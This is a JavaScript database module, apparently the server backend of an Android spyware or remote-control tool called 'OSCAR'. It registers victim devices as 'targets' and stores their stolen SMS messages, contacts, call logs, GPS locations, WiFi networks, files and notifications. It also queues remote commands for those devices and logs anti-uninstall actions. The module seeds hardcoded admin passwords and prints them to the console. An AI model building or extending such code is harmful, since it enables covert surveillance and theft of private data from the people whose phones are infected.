const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const bcrypt = require('bcryptjs');

class Database {
    constructor() {
        this.db = new sqlite3.Database(path.join(__dirname, 'oscar.db'), (err) => {
            if (err) {
                console.error('❌ Database connection error:', err);
            } else {
                console.log('✅ Database connected');
                this.init();
            }
        });
    }

    init() {
        // Users table
        this.db.run(`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            email TEXT,
            role TEXT DEFAULT 'user',
            oscar_id TEXT UNIQUE,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_login DATETIME,
            api_key TEXT UNIQUE,
            is_active INTEGER DEFAULT 1
        )`);

        // Targets table
        this.db.run(`CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            oscar_id TEXT,
            device_id TEXT UNIQUE,
            device_name TEXT,
            device_model TEXT,
            android_version TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME,
            is_online INTEGER DEFAULT 0,
            battery_level INTEGER,
            sim_slot1 TEXT,
            sim_slot2 TEXT,
            operator TEXT,
            all_permissions_granted INTEGER DEFAULT 0,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )`);

        // Collected data table
        this.db.run(`CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            data_type TEXT,
            data_content TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            file_path TEXT,
            is_synced INTEGER DEFAULT 1,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // SMS table
        this.db.run(`CREATE TABLE IF NOT EXISTS sms_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            phone_number TEXT,
            message TEXT,
            type TEXT,
            timestamp DATETIME,
            is_read INTEGER DEFAULT 0,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Contacts table
        this.db.run(`CREATE TABLE IF NOT EXISTS contacts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            name TEXT,
            phone_number TEXT,
            email TEXT,
            photo BLOB,
            last_updated DATETIME,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Call logs table
        this.db.run(`CREATE TABLE IF NOT EXISTS call_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            phone_number TEXT,
            duration INTEGER,
            type TEXT,
            timestamp DATETIME,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Locations table
        this.db.run(`CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            altitude REAL,
            speed REAL,
            timestamp DATETIME,
            address TEXT,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // WiFi networks table
        this.db.run(`CREATE TABLE IF NOT EXISTS wifi_networks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            ssid TEXT,
            bssid TEXT,
            security TEXT,
            signal_strength INTEGER,
            frequency INTEGER,
            last_seen DATETIME,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Files table
        this.db.run(`CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            file_name TEXT,
            file_path TEXT,
            file_size INTEGER,
            file_type TEXT,
            modified_date DATETIME,
            is_deleted INTEGER DEFAULT 0,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Commands table
        this.db.run(`CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            command TEXT,
            parameters TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            executed_at DATETIME,
            completed_at DATETIME,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Notifications table
        this.db.run(`CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            app_name TEXT,
            title TEXT,
            content TEXT,
            timestamp DATETIME,
            is_read INTEGER DEFAULT 0,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Anti-uninstall logs
        this.db.run(`CREATE TABLE IF NOT EXISTS anti_uninstall_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            oscar_id TEXT,
            action TEXT,
            timestamp DATETIME,
            success INTEGER DEFAULT 1,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Sessions table
        this.db.run(`CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            oscar_id TEXT,
            session_token TEXT UNIQUE,
            device_info TEXT,
            ip_address TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            expires_at DATETIME,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )`);

        // Activity logs
        this.db.run(`CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_id INTEGER,
            oscar_id TEXT,
            action TEXT,
            details TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id),
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )`);

        // Create default admin users untuk testing
        this.createDefaultUsers();
    }

    generateOscarId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = 'OSC-';
        for (let i = 0; i < 3; i++) {
            for (let j = 0; j < 4; j++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            if (i < 2) result += '-';
        }
        return result;
    }

    createDefaultUsers() {
        // AKUN 1: Admin Utama
        const adminPass1 = bcrypt.hashSync('admin123', 10);
        this.db.run(`INSERT OR IGNORE INTO users (username, password, email, role, oscar_id, api_key) VALUES 
            ('admin', ?, 'admin@oscar.com', 'admin', ?, ?)`,
            [adminPass1, this.generateOscarId(), this.generateApiKey()]
        );

        // AKUN 2: oscarprojek (sesuai HTML)
        const adminPass2 = bcrypt.hashSync('oscar2404', 10);
        this.db.run(`INSERT OR IGNORE INTO users (username, password, email, role, oscar_id, api_key) VALUES 
            ('oscarprojek', ?, 'oscar@projek.com', 'admin', ?, ?)`,
            [adminPass2, this.generateOscarId(), this.generateApiKey()]
        );

        // AKUN 3: user testing
        const userPass = bcrypt.hashSync('user1234', 10);
        this.db.run(`INSERT OR IGNORE INTO users (username, password, email, role, oscar_id, api_key) VALUES 
            ('user', ?, 'user@test.com', 'user', ?, ?)`,
            [userPass, this.generateOscarId(), this.generateApiKey()]
        );

        console.log('✅ Default users created:');
        console.log('   1. admin : admin123');
        console.log('   2. oscarprojek : oscar2404');
        console.log('   3. user : user1234');
    }

    generateApiKey() {
        return 'oscar_' + Math.random().toString(36).substring(2, 15) + 
               Math.random().toString(36).substring(2, 15);
    }

    // ========== USER METHODS ==========
    async authenticateUser(username, password) {
        return new Promise((resolve, reject) => {
            this.db.get('SELECT * FROM users WHERE username = ? AND is_active = 1', 
                [username], (err, user) => {
                    if (err || !user) reject('User not found');
                    else if (bcrypt.compareSync(password, user.password)) {
                        this.db.run('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', [user.id]);
                        resolve(user);
                    } else reject('Invalid password');
                }
            );
        });
    }

    async getUserByOscarId(oscar_id) {
        return new Promise((resolve, reject) => {
            this.db.get('SELECT * FROM users WHERE oscar_id = ?', [oscar_id], (err, user) => {
                if (err) reject(err);
                else resolve(user);
            });
        });
    }

    // ========== TARGET METHODS ==========
    async registerTarget(data) {
        return new Promise((resolve, reject) => {
            const {
                oscar_id, device_id, device_name, device_model, android_version,
                ip_address, country, city, sim_slot1, sim_slot2, operator,
                battery_level, all_permissions_granted
            } = data;

            // First get user_id from oscar_id
            this.db.get('SELECT id FROM users WHERE oscar_id = ?', [oscar_id], (err, user) => {
                if (err || !user) {
                    reject('Invalid OSCAR ID');
                    return;
                }

                this.db.run(`INSERT OR REPLACE INTO targets 
                    (user_id, oscar_id, device_id, device_name, device_model, android_version, 
                     ip_address, country, city, sim_slot1, sim_slot2, operator, 
                     last_seen, is_online, battery_level, all_permissions_granted)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 1, ?, ?)`,
                    [user.id, oscar_id, device_id, device_name, device_model, android_version,
                     ip_address, country, city, sim_slot1, sim_slot2, operator,
                     battery_level, all_permissions_granted || 1],
                    function(err) {
                        if (err) reject(err);
                        else resolve({ id: this.lastID, device_id });
                    }
                );
            });
        });
    }

    async updateTargetStatus(device_id, is_online, battery = null) {
        return new Promise((resolve, reject) => {
            let query = 'UPDATE targets SET last_seen = CURRENT_TIMESTAMP, is_online = ?';
            const params = [is_online];
            
            if (battery !== null) {
                query += ', battery_level = ?';
                params.push(battery);
            }
            
            query += ' WHERE device_id = ?';
            params.push(device_id);

            this.db.run(query, params, (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    async getTarget(device_id) {
        return new Promise((resolve, reject) => {
            this.db.get('SELECT * FROM targets WHERE device_id = ?', [device_id], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        });
    }

    async getAllTargets(oscar_id) {
        return new Promise((resolve, reject) => {
            this.db.all('SELECT * FROM targets WHERE oscar_id = ? ORDER BY last_seen DESC', 
                [oscar_id], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
    }

    // ========== DATA COLLECTION METHODS ==========
    async saveCollectedData(target_id, oscar_id, data_type, data_content, file_path = null) {
        return new Promise((resolve, reject) => {
            this.db.run(`INSERT INTO collected_data (target_id, oscar_id, data_type, data_content, file_path)
                VALUES (?, ?, ?, ?, ?)`,
                [target_id, oscar_id, data_type, data_content, file_path],
                function(err) {
                    if (err) reject(err);
                    else resolve(this.lastID);
                }
            );
        });
    }

    async saveSMS(target_id, oscar_id, messages) {
        return new Promise((resolve, reject) => {
            const stmt = this.db.prepare(`INSERT INTO sms_messages 
                (target_id, oscar_id, phone_number, message, type, timestamp) VALUES (?, ?, ?, ?, ?, ?)`);
            
            messages.forEach(msg => {
                stmt.run([target_id, oscar_id, msg.phone, msg.text, msg.type, msg.timestamp || new Date().toISOString()]);
            });
            
            stmt.finalize((err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    async saveContacts(target_id, oscar_id, contacts) {
        return new Promise((resolve, reject) => {
            const stmt = this.db.prepare(`INSERT INTO contacts 
                (target_id, oscar_id, name, phone_number, email, last_updated) VALUES (?, ?, ?, ?, ?, ?)`);
            
            contacts.forEach(contact => {
                stmt.run([target_id, oscar_id, contact.name, contact.phone, contact.email || '', new Date().toISOString()]);
            });
            
            stmt.finalize((err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    async saveLocation(target_id, oscar_id, location) {
        return new Promise((resolve, reject) => {
            this.db.run(`INSERT INTO locations 
                (target_id, oscar_id, latitude, longitude, accuracy, altitude, speed, timestamp, address)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [target_id, oscar_id, location.lat, location.lng, location.accuracy, 
                 location.altitude, location.speed, location.timestamp || new Date().toISOString(), location.address],
                (err) => {
                    if (err) reject(err);
                    else resolve();
                }
            );
        });
    }

    // ========== COMMAND METHODS ==========
    async addCommand(target_id, oscar_id, command, parameters = null) {
        return new Promise((resolve, reject) => {
            this.db.run(`INSERT INTO commands (target_id, oscar_id, command, parameters, executed_at)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)`,
                [target_id, oscar_id, command, parameters],
                function(err) {
                    if (err) reject(err);
                    else resolve(this.lastID);
                }
            );
        });
    }

    async getPendingCommands(target_id) {
        return new Promise((resolve, reject) => {
            this.db.all(`SELECT * FROM commands 
                WHERE target_id = ? AND status = 'pending' 
                ORDER BY id ASC`, [target_id], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
    }

    async updateCommandStatus(command_id, status, result = null) {
        return new Promise((resolve, reject) => {
            this.db.run(`UPDATE commands SET status = ?, result = ?, completed_at = CURRENT_TIMESTAMP
                WHERE id = ?`, [status, result, command_id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    // ========== ANTI-UNINSTALL METHODS ==========
    async logAntiUninstall(target_id, oscar_id, action, success = true) {
        return new Promise((resolve, reject) => {
            this.db.run(`INSERT INTO anti_uninstall_logs (target_id, oscar_id, action, success)
                VALUES (?, ?, ?, ?)`, [target_id, oscar_id, action, success ? 1 : 0], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    // ========== SESSIONS ==========
    async createSession(user_id, oscar_id, device_info, ip) {
        const token = require('crypto').randomBytes(64).toString('hex');
        const expires = new Date();
        expires.setDate(expires.getDate() + 7);

        return new Promise((resolve, reject) => {
            this.db.run(`INSERT INTO sessions (user_id, oscar_id, session_token, device_info, ip_address, expires_at)
                VALUES (?, ?, ?, ?, ?, ?)`,
                [user_id, oscar_id, token, device_info, ip, expires.toISOString()],
                function(err) {
                    if (err) reject(err);
                    else resolve({ token, expires });
                }
            );
        });
    }

    // ========== STATISTICS ==========
    async getStatistics(oscar_id) {
        return new Promise((resolve, reject) => {
            const stats = {};
            
            this.db.get('SELECT COUNT(*) as total FROM targets WHERE oscar_id = ?', [oscar_id], (err, row) => {
                stats.total_targets = row.total;
                
                this.db.get('SELECT COUNT(*) as online FROM targets WHERE oscar_id = ? AND is_online = 1', [oscar_id], (err, row) => {
                    stats.online_targets = row.online;
                    
                    this.db.get('SELECT COUNT(*) as data FROM collected_data WHERE oscar_id = ?', [oscar_id], (err, row) => {
                        stats.total_data = row.data;
                        
                        this.db.get('SELECT COUNT(*) as sms FROM sms_messages WHERE oscar_id = ?', [oscar_id], (err, row) => {
                            stats.total_sms = row.sms;
                            
                            this.db.get('SELECT COUNT(*) as contacts FROM contacts WHERE oscar_id = ?', [oscar_id], (err, row) => {
                                stats.total_contacts = row.contacts;
                                resolve(stats);
                            });
                        });
                    });
                });
            });
        });
    }
}

module.exports = new Database();
